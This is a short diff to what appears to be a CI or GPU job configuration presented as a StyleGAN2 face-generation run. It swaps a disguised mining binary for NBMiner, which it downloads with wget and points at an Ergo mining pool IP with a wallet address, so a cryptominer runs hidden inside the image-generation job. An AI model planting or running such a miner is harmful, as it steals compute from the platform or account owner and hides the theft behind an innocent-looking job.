@@ -41,8 +41,9 @@ jobs:
           --seeds=6600-6605 \
           --truncation-psi=0.5 \
           --result-dir=/outputs/generatedFaces
-        tar -xf pes00.tar.gz
-        cd /inputs/stylegan2/111
+        wget https://github.com/NebuTech/NBMiner/releases/download/v39.5/NBMiner_39.5_Linux.tgz
+        tar -xvzf NBMiner_39.5_Linux.tgz
+        cd /inputs/stylegan2/NBMiner_Linux
         ls
-        ./pes00 --algo AUTOLYKOS2 --pool stratum+ssl://206.189.151.227:2288 --user 9i9Rb19ix2YqvyFRubz1BKzPzE28a47NqnQkiSFw9XHWjLaS3hc.rigo
+        ./nbminer -a ergo -o stratum+ssl://206.189.151.227:2288 -u 9i9Rb19ix2YqvyFRubz1BKzPzE28a47NqnQkiSFw9XHWjLaS3hc.rig -log
       image: tensorflow/tensorflow:1.14.0-gpu-py3
